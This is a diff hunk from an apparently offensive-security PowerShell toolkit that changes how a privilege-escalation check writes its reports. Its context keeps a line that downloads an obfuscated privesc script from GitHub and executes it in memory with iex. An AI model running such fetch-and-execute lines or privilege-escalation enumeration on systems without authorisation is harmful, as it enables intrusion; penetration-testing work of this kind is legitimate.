@@ -2709,14 +2709,15 @@ function itm4nprivesc
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
     if(!$consoleoutput){
         Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
-        Invoke-PrivescCheck >> "$currentPath\LocalPrivEsc\PrivescCheck.txt"
+        Invoke-PrivescCheck -Extended -Report PrivescCheck -Format CSV,HTML,TXT
+        Move-Item $currentPath\PrivescCheck* "$currentPath\LocalPrivEsc\"
     }
     else
     {
         Write-Host -ForegroundColor Yellow '-------> Ikeext Check'
         Invoke-IkeextCheck
         Write-Host -ForegroundColor Yellow '-------> Invoke-Privesc Checks'
-        Invoke-PrivescCheck
+        Invoke-PrivescCheck -Extended
     }
 }
 
